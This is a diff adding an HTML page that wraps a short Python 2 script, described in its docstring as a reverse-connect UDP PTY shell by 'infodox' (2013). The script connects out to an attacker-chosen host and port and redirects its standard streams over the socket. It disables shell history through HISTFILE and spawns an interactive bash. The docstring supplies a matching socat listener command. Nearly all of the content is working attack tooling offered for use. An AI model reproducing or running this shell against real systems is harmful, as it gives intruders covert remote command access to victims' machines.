@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>udp_pty_reverse.py</title>
+</head><body>#!/usr/bin/python2<br/>
+"""<br/>
+Reverse Connect UDP PTY Shell - testing version<br/>
+infodox - insecurety.net (2013)<br/>
+<br/>
+Please note this may not work and I need to clean it up.<br/>
+It is also COMPLETELY untested as right now I do not have a<br/>
+linux box to test it on. I will do so later today.<br/>
+<br/>
+Gives a reverse connect PTY over UDP.<br/>
+<br/>
+For an excellent listener use the following socat command:<br/>
+socat file:`tty`,echo=0,raw &nbsp;udp-listen:PORT<br/>
+"""<br/>
+import os<br/>
+import pty<br/>
+import socket<br/>
+<br/>
+lhost = "127.0.0.1" # XXX: CHANGEME<br/>
+lport = 31337 # XXX: CHANGEME<br/>
+<br/>
+def main():<br/>
+&nbsp; &nbsp; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br/>
+&nbsp; &nbsp; s.connect((lhost, lport))<br/>
+&nbsp; &nbsp; os.dup2(s.fileno(),0)<br/>
+&nbsp; &nbsp; os.dup2(s.fileno(),1)<br/>
+&nbsp; &nbsp; os.dup2(s.fileno(),2)<br/>
+&nbsp; &nbsp; os.putenv("HISTFILE",'/dev/null')<br/>
+&nbsp; &nbsp; pty.spawn("/bin/bash")<br/>
+&nbsp; &nbsp; s.close()<br/>
+&#09;<br/>
+if __name__ == "__main__":<br/>
+&nbsp; &nbsp; main()</body></html>
